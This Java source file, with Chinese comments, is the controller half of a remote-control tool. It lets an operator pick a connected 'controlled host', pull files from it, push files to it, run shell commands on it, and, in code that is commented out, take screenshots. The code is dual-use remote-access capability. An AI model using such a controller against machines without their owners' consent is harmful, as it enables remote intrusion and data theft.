package winTest;

import java.io.*;

import java.net.Socket;

import java.text.SimpleDateFormat;

import java.util.Date;
import java.util.Iterator;


public class ControlUnit {

    SocketNode socketNode; //当前被控主机
    private SimpleDateFormat dateFormat; //日期格式
    private String storagePath; //文件存放路径

//    private Window window; //交互窗口

    //构造函数(默认存放路径)
    public ControlUnit()
    {
        //设置日志时间板式
        dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

        //设置文件路径(程序路径下的Storage文件夹)
        String sPath = System.getProperty("user.dir");
        sPath += "\\Storage";
        this.storagePath = sPath;
        makePath(sPath);
    }

    //构造函数(指定文件存放路径)
    public ControlUnit(String storagePath)
    {
        //设置日志时间板式
        dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

        //设置文件路径(指定路径)
        this.storagePath = storagePath;
        makePath(storagePath);
    }

    //绑定窗口
//    public void SetWindow(Window window)
//    {
//        this.window = window;
//    }

    //装载控制单元
    public boolean LoadTarget(SocketNode socketNode)
    {
    	writeLog("SocketPack refreshing...");
        int length = Adapter.SocketPack.size();
        int deleted = 0;
        Iterator<SocketNode> nodeIterator = Adapter.SocketPack.iterator();
        SocketNode node;
        while(nodeIterator.hasNext())
        {
            node = nodeIterator.next();
            if(!node.IsLock() && !node.IsAlive())
            {
//                if(window != null)
//                {
//                    window.hostListModel.removeElement(node.GetHostAddress() + " : " + node.GetPort());
//                }
                deleted++;
                nodeIterator.remove();
            }
        }
        writeLog("SocketPack Refreshed finished, deleted " + deleted + " of " + length + " sockets in SocketPack");
        Adapter.refrehClientNums();
        Adapter.refreshSelectClient();
        if(this.socketNode != null && this.socketNode.IsLock())
        {
            writeLog("Unable to change control target, please wait for the current task to complete!");
            return false;
        }
        else
        {
            this.socketNode = socketNode;
            writeLog("Control target set to '" + socketNode.GetHostAddress() + "' successfully!");
//            if(window != null) { window.ChangeOperationOutputAreaTitle("Connection:" + socketNode.GetHostAddress()); }
            return true;
        }
    }

    //返回当前的被控SocketNode
    public SocketNode GetLoadedTarget()
    {
        return socketNode;
    }

    //针对当前被控对象执行指令
    synchronized public boolean ExecuteCommand(String command)
    {
        //连接情况判断
        if(socketNode == null)
        {
            writeLog("Select a target before execute command!");
            return false;
        }
        else if(!socketNode.IsAlive())
        {
            writeLog("Socket not exist anymore!");
            return false;
        }

        //执行指令
        writeLog("Executing command:" + command);
        /*
         获取文件操作     | 参数1: FETCHFILE   参数2:文件路径
         发送文件操作     | 参数1: SENDFILE    参数2: 发送文件名称(文件位于存储路径)   参数3: 文件存放目录(不包含文件名)
         执行SHELL操作    | 参数1: SHELL       参数2: shell指令
         */

        String [] args = command.split("\\|");
        for(int i = args.length - 1; i >= 0; i--) { args[i] = args[i].trim(); }

        //执行指令
        boolean executeResult = true;
        socketNode.Lock();
        try
        {
            //所有指令的客户端二次OK确认为必须，主要目的是防止连续两个不同的输出被客户端一次接受导致信息接收异常
            switch (args[0]) {
                //获取文件
                case "FETCHFILE":
                    if(args.length < 2) { writeLog("Params is to less!"); return false; }
                    SendBrief(socketNode.GetSocket(), "FETCHFILE");
                    if (ReadBrief(socketNode.GetSocket()).equalsIgnoreCase("OK"))
                    {
                        FetchFileHandler(socketNode.GetSocket(), storagePath, args[1]);
                    }
                    break;

                //发送文件
                case "SENDFILE":
                    if(args.length < 3) { writeLog("Params is to less!"); return false; }
                    SendBrief(socketNode.GetSocket(), "SENDFILE");
                    if (ReadBrief(socketNode.GetSocket()).equalsIgnoreCase("OK"))
                    {
                        SendFileHandler(socketNode.GetSocket(), storagePath, args[1], args[2]);
                    }
                    break;

                //执行SHELL指令
                case "SHELL":
                    if(args.length < 2) { writeLog("Params is to less!"); return false; }
                    SendBrief(socketNode.GetSocket(), "SHELL");
                    if (ReadBrief(socketNode.GetSocket()).equalsIgnoreCase("OK"))
                    {
                        ShellHandler(socketNode.GetSocket(), args[1]);
                    }
           
                    break;

                /*
                //执行截图指令
                case "SCREENSHOT":
                    SendBrief(socketNode.GetSocket(), "SCREENSHOT");
                    if (ReadBrief(socketNode.GetSocket()).equalsIgnoreCase("OK"))
                    {
                        ScreenShotHandler(socketNode.GetSocket(), storagePath);
                    }
                    break;
                */
                //未知操作
                default:
                    writeLog("Undefined Command!");
                    executeResult = false;
            }
        }
        catch(IOException e)
        {
            writeLog("Execute failed, connection lost!");
            executeResult = false;
        }

        socketNode.Unlock();

        return executeResult;
    }

    //创建文件路径
    private void makePath(String path)
    {
        File file = new File(path);
        if(!file.exists()) { file.mkdirs(); }
    }

    //写出日志到控制台
    private void writeLog(String logLine)
    {
        String log = dateFormat.format(new Date()) + " | " + logLine;
        System.out.println(log);
        Adapter.commandNotice(log);
//        if(window != null) { window.AppendConnectionLog(log); }
    }

    //使用套接字发送简短数据
    public static void SendBrief(Socket socket, String line) throws IOException
    {
        OutputStream out = socket.getOutputStream();
        out.write(line.getBytes("GBK"));
        out.flush();
    }

    //从套接字中读取简短数据
    public static String ReadBrief(Socket socket) throws IOException
    {
        String response = "";
        InputStream in = socket.getInputStream();
        byte[] buffer = new byte[2048]; //1024个汉字, 应该够了吧..
        int len = in.read(buffer);
        response = new String(buffer, 0, len);
        return response;
    }

    //从套接字中接收文件
    public static void ReceiveFile(Socket socket, long fileSize, String storagePath) throws IOException
    {
        DataOutputStream dos = null; //写出数据到文件
        DataInputStream dis = null; //从socket流中读入数据

        try
        {
            //打开文件输出流和socket输入流
            dos=new DataOutputStream(new BufferedOutputStream(new FileOutputStream(storagePath)));
            dis=new DataInputStream(socket.getInputStream());

            //数据缓冲区
            int buffferSize = 1024;
            byte[]bufArray = new byte[buffferSize];
            int len = 0;

            //不断读取数据流直到文件全部接收
            long remainSize = fileSize;
            while (remainSize > 0)
            {
                len = dis.read(bufArray);
                dos.write(bufArray, 0, len);
                dos.flush();
                remainSize -= len;
            }
        }
        catch (IOException e) { throw e; }
        finally
        {
            try
            {
                if (dos != null) { dos.close(); }
            }
            catch (IOException e) {}
        }
    }

    //向套接字发送文件
    private void SendFile(Socket socket, String filePath)
    {
        File file = new File(filePath);

        //检查文件是否存在
        if(!file.exists())
        {
            System.out.println("Can not open file:" + filePath);
            return;
        }

        //输出文件
        FileInputStream fin = null;
        DataOutputStream dout = null;
        try
        {
            fin = new FileInputStream(file);
            dout = new DataOutputStream((socket.getOutputStream()));

            int sendedLength = 0;
            byte[] byteBuffer = new byte[1024];

            while ((sendedLength = fin.read(byteBuffer, 0, 1024)) > 0)
            {
                dout.write(byteBuffer, 0, sendedLength);
                dout.flush();
            }
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
        finally
        {
            try
            {
                if(fin != null) { fin.close(); }
            }
            catch(IOException e)
            {
                e.printStackTrace();
            }
        }
    }

    /* 以下为静态功能函数区域, 勿动 */
    //从套接字接收文件(到指定的路径)
    private void FetchFileHandler(Socket socket, String storagePath, String filePath) throws IOException
    {
        //提取文件名并构建文件存放路径
        int pos1 = filePath.lastIndexOf('\\');
        int pos2 = filePath.lastIndexOf('/');
        int pos = Math.max(pos1, pos2);
        if(pos == -1) { storagePath += "\\"; pos = 0; }
        String fileName = filePath.substring(pos, filePath.length());
        String sPath = storagePath + fileName;

        //通知客户端请求文件的路径
        SendBrief(socket, filePath);
        String response = ReadBrief(socket);
        if (response.equalsIgnoreCase("ERROR")) {
            writeLog("Request file not exist!");
            return;
        }

        //回应服务器
        SendBrief(socket, "OK");

        //接收文件
        writeLog("Fetching file:" + filePath);
        long fileSize = Long.parseLong(response);
        ReceiveFile(socket,fileSize, sPath);
        writeLog("File fetch finished, storage location:" + sPath);
    }

    //发送指定的文件到指定的路径
    private void SendFileHandler(Socket socket, String localStoragePath1, String sendFileName1, String storagePath) throws IOException
    {
    	String tempLine = sendFileName1;
    	int endPos1 = tempLine.lastIndexOf('\\');
    	int endPos2 = tempLine.lastIndexOf('/');
    	
    	int endPos = Math.max(endPos1, endPos2);
    	
    	String localStoragePath = tempLine.substring(0, endPos);
    	String sendFileName = tempLine.substring(endPos + 1, tempLine.length());
 
    	
        //发送文件大小
        String localFullPath = localStoragePath + "\\" + sendFileName;
        //String localFullPath = sendFileName;
        File targetFile = new File(localFullPath);
        if(!targetFile.exists())
        {
            writeLog("Target file not exist!");
            return;
        }

        //发送文件大小
        long fileSize = targetFile.length();
        SendBrief(socket, Long.toString(fileSize));
        ReadBrief(socket);

        //发送文件路径和名称
        SendBrief(socket, storagePath);
        ReadBrief(socket);
        SendBrief(socket, sendFileName);

        String response = ReadBrief(socket);
        if(response.equalsIgnoreCase("ERROR"))
        {
            writeLog("Unable to open storage path in target host!");
            return;
        }

        //发送文件
        writeLog("Sending file...");
        SendFile(socket, localFullPath);
        writeLog("File sent successfully!");
    }

    //执行shell指令并返回结果
    private void ShellHandler(Socket socket, String cmd) throws IOException
    {
        //发送执行的指令
        SendBrief(socket, cmd);

        //接收返回值
        String response = ReadBrief(socket);
        if(response.equalsIgnoreCase("ERROR"))
        {
            writeLog("Execute shell command failed!");
            return;
        }
        SendBrief(socket, "OK");

        int length = Integer.parseInt(response);
        byte [] buffer = new byte[length];
        socket.getInputStream().read(buffer);
        String res = new String(buffer,"GBK");
        writeLog("Execute finished, response:\n" + res);
    }

    //执行截图指令并获取截图文件
    private void ScreenShotHandler(Socket socket, String storagePath) throws IOException
    {
        //确认信息(同步用，避免信息混淆)
        SendBrief(socket, "OK");

        //判断截图是否成功
        String response = ReadBrief(socket);
        if(response.equalsIgnoreCase("ERROR"))
        {
            writeLog("Take screenshot failed!");
            return;
        }

        //获取截图大小
        long fileSize = Long.parseLong(response);
        //向客户端确认
        SendBrief(socket, "OK");
        //获取截图名称
        String fileName = ReadBrief(socket);
        //向客户端确认
        SendBrief(socket, "OK");

        //文件存放路径
        String sPath = storagePath + "\\" + fileName;
        ReceiveFile(socket,fileSize, sPath);
        writeLog("Take screenshot succeed, storage location:" + sPath);
    }
}
